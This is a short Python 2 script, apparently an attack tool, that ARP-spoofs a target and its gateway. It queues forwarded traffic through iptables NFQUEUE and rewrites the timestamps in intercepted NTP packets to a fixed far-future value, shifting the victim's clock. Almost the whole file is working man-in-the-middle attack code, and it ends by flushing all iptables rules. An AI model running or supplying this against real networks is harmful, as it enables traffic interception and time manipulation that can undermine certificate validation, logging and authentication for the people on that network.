#! /usr/bin/env python2.7
import os
import sys
from scapy.all import *
from netfilterqueue import NetfilterQueue

def getMACAddress(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src

def Spoof(gatewayip, targetip):
    targetmac = getMACAddress(targetip)
    gatewaymac = getMACAddress(gatewayip)
    send(ARP(op = 2, pdst = targetip, psrc = gatewayip, hwdst = targetmac))
    send(ARP(op = 2, pdst = gatewayip, psrc = targetip, hwdst = gatewaymac))

def Restore(gatewayip, targetip):
    targetmac = getMACAddress(targetip)
    gatewaymac = getMACAddress(gatewayip)
    send(ARP(op = 2, pdst = gatewayip, psrc = targetip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= targetmac), count = 4) 
    send(ARP(op = 2, pdst = targetip, psrc = gatewayip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewaymac), count = 4)

def modify(packet):
    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string
    if pkt[IP].haslayer(UDP):
        if pkt[UDP].sport == 123 or pkt[UDP].dport == 123:
            pkt[UDP].decode_payload_as(NTP)
            pkt[NTP].sent = 4264916413
            pkt[NTP].ref = 4264916413
            pkt[NTP].recv = 4264916413
            npkt = IP(src=pkt[IP].src, dst=pkt[IP].dst)/UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)/pkt[NTP]
            packet.set_payload(str(npkt))
    packet.accept() #accept the packet

# Enables package forwarding
os.system('echo -e "1\n" > /proc/sys/net/ipv4/ip_forward')

# Add a rule to iptables: when a package should be forwarded, send it to the queue before   
#os.system('iptables -A FORWARD -j NFQUEUE --queue-num 55')
os.system('iptables -A INPUT -j NFQUEUE --queue-num 73')
#Spoof('192.168.1.1', '192.168.1.164')

# Create a package queue to analyze the incoming packets
nfqueue = NetfilterQueue()
nfqueue.bind(73, modify) 

try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    pass

#Restore('192.168.1.1', '192.168.1.164')
os.system('iptables -F')
